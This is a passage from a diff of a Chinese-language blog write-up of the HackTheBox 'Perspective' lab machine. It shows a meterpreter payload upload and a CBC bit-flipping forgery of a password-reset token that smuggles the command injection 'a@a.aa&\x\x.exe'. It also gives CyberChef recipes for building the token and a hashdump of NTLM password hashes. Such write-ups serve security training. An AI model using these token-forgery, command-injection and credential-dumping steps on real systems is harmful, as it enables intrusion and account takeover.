pwd</span><br><span class="line">C:\x</span><br><span class="line">meterpreter &gt; upload /Users/miao/use_miao_wwwwwww/Hacking/HackTheBox/Perspective/shell.exe</span><br><span class="line">mv shell.exe x.exe</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 前16个字节，即10进制的前32，是IV</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; data = <span class="string">"bde740b448b5b5bf264baedd512bf50aaa232c740f21fc211b1754a1f5a485a378d1dd4a6f363bb4a4b48198ebd42319"</span></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; data[:32]</span></span><br><span class="line">'bde740b448b5b5bf264baedd512bf50a'</span><br><span class="line"></span><br><span class="line">两个xor</span><br><span class="line"><span class="meta">#</span><span class="bash"> 第一个，原本邮箱</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 6140612e616120202020202020202020</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> a@a.aa</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 第二个地方，修改后的命令注入</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 原本的 6140612e6161265c785c782e65786520</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> a@a.aa&amp;\x\x.exe </span></span><br><span class="line"></span><br><span class="line">https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')XOR(%7B'option':'Hex','string':'6140612e616120202020202020202020'%7D,'Standard',false)XOR(%7B'option':'Hex','string':'6140612e6161265c785c782e65786520'%7D,'Standard',false)To_Hex('None',0)&amp;input=YmRlNzQwYjQ0OGI1YjViZjI2NGJhZWRkNTEyYmY1MGE</span><br><span class="line"></span><br><span class="line">bde740b448b5b5bf264baedd512bf50a</span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"></span></span><br><span class="line">bde740b448b5b3c37e37f6d31473b00a</span><br><span class="line"></span><br><span class="line">得到的结果作为新的IV：</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; data[32:]</span></span><br><span class="line">'aa232c740f21fc211b1754a1f5a485a378d1dd4a6f363bb4a4b48198ebd42319'</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; <span class="string">"bde740b448b5b3c37e37f6d31473b00a"</span> + <span class="string">'aa232c740f21fc211b1754a1f5a485a378d1dd4a6f363bb4a4b48198ebd42319'</span></span></span><br><span class="line">'bde740b448b5b3c37e37f6d31473b00aaa232c740f21fc211b1754a1f5a485a378d1dd4a6f363bb4a4b48198ebd42319'</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 生成新token</span></span><br><span class="line">https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')To_Base64('A-Za-z0-9%2B/%3D')Find_/_Replace(%7B'option':'Simple%20string','string':'%2B'%7D,'-',true,false,true,false)Find_/_Replace(%7B'option':'Simple%20string','string':'/'%7D,'_',true,false,true,false)&amp;input=YmRlNzQwYjQ0OGI1YjNjMzdlMzdmNmQzMTQ3M2IwMGFhYTIzMmM3NDBmMjFmYzIxMWIxNzU0YTFmNWE0ODVhMzc4ZDFkZDRhNmYzNjNiYjRhNGI0ODE5OGViZDQyMzE5</span><br><span class="line"></span><br><span class="line">vedAtEi1s8N-N_bTFHOwCqojLHQPIfwhGxdUofWkhaN40d1KbzY7tKS0gZjr1CMZ</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 注意前面得到token那里一直中断在那里，不要forward</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 替换新token，重定向到修改密码界面，修改密码发送，触发命令注入</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022060122.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022060122.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="root-flag"><a href="#root-flag" class="headerlink" title="root flag"></a>root flag</h1><p>Administrator桌面，root.txt:</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022060123.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022060123.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+
+
 <h2 id="hash"><a href="#hash" class="headerlink" title="hash"></a>hash</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; hashdump</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:3ebc094377ee665f31a78f536ba4f1af:::</span><br><span class="line">dbuser:1003:aad3b435b51404eeaad3b435b51404ee:ffdd348640d3215cfe351d5cf928cb93:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">sqladmin:1001:aad3b435b51404eeaad3b435b51404ee:17e1ecc085fb5fd49810495ca173052e:::</span><br><span class="line">sshd:1005:aad3b435b51404eeaad3b435b51404ee:4edb911b4f987283a91a175c6d4445bb:::</span><br><span class="line">WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:7cd9849be63b88b3f4e910cdae120f3d:::</span><br><span class="line">webuser:1004:aad3b435b51404eeaad3b435b51404ee:9c101375df857fad5e6bec682ffa4187:::</span><br></pre></td></tr></table></figure>
 
 
